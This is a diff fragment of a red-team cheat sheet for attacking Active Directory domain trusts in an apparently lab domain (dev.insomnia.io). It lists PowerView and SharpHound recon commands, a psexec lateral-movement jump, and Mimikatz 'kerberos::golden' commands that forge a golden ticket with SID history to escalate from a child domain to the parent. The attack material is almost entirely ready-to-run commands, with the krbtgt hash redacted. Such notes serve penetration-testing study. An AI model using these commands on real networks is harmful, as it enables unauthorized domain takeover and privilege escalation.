@@ -1,5 +1,6 @@
 ### Domain Trusts Recon
 ```
+
 powershell Get-DomainTrust -Domain dev.insomnia.io 
 powershell Get-DomainComputer -Domain dev.insomnia.io | select DnsHostName
 SharpHound3 "-c All -D dev.insomnia.io"
@@ -12,6 +13,7 @@ jump psexec dtop685.dev.insomnia.io SMB
 ```
 ### Bidirectional Parent/Child
 ```
+powershell Get-DomainTrust
 powershell Get-DomainGroup -Identity 'Domain Admins' -Domain insomnia.io  | select ObjectSid
 kerberos::golden /user:<> /domain:<> /sid:<> /sids:<> /krbtgt:<>
 kerberos::golden /user:Administrator /domain:dev.insomnia.io  /sid:S-1-5-21-2824171953-2587308990-2984250211 /sids:S-1-5-21-3063796876-3415205720-618848691-512 /krbtgt:REDACTED /ticket:zps.kirbi
